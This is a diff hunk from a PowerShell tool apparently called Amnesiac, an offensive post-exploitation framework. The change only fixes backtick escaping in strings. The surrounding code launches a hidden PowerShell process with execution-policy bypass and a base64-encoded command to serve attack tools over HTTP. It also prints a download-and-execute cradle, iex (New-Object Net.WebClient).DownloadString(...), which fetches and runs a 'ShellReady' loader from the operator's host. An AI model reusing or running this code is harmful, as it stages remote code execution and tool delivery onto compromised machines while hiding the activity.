@@ -1045,17 +1045,17 @@ function Amnesiac {
 
 			$global:ServerURL = "http://$($DefineHostname):$userdefPort/Tools"
 
-			$scriptWithCommand = $FileServerScript + "``nFile-Server -Port $userdefPort -Path '$serveRoot'"
+			$scriptWithCommand = $FileServerScript + "`nFile-Server -Port $userdefPort -Path '$serveRoot'"
 			$bytes          = [System.Text.Encoding]::Unicode.GetBytes($scriptWithCommand)
 			$encodedCommand = [Convert]::ToBase64String($bytes)
-			$global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden ``
+			$global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
 				-ArgumentList "-ep Bypass", "-NoProfile", "-enc $encodedCommand" -PassThru
 			$processId = $global:FileServerProcess.Id
 
 			$loaderURL       = "http://$($DefineHostname):$userdefPort/Amnesiac_ShellReady.ps1"
-			$global:Message  = " [+] File server started (PID $processId)``n"
-			$global:Message += " [+] Tools:  $($global:ServerURL)``n"
-			$global:Message += " [+] Loader: $loaderURL``n"
+			$global:Message  = " [+] File server started (PID $processId)`n"
+			$global:Message += " [+] Tools:  $($global:ServerURL)`n"
+			$global:Message += " [+] Loader: $loaderURL`n"
 			$global:Message += "     Scenario 2: iex (New-Object Net.WebClient).DownloadString('$loaderURL'); Amnesiac"
 
 			$parentProcessId = $PID
